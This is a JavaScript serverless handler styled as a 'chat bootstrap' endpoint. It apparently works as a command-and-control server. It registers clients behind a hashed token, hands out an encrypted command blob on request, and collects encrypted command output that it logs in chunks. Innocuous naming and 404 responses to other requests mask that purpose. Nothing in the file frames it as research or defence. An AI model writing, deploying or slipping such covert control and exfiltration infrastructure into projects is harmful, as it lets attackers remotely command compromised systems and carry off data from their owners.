import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '23';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
